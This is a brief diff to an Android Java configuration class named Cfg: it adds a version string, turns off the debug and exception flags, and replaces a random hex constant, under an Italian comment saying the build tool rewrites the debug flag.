@@ -2,8 +2,10 @@ package com.android.service.auto;
 
 public class Cfg {
 	//ATTENZIONE, NON CAMBIARE A MANO LA VARIABILE DEBUG, VIENE RISCRITTA DA ANT
-	public static final boolean DEBUG = true;
-	public static final boolean EXCEPTION = true;
+	public static final String VERSION = "v2";
+	
+	public static final boolean DEBUG = false;
+	public static final boolean EXCEPTION = false;
 	public static final boolean EXP = false;
 	public static boolean DEMO = false;
 	
@@ -13,5 +15,5 @@ public class Cfg {
 	public static final boolean ACTIVITY = false;
 	public static final boolean MICFILE = false;
 	
-	public static final String RANDOM = "D0FBE400778B65DC";
+	public static final String RANDOM = "F18CDCFFED6C37E2";
 }
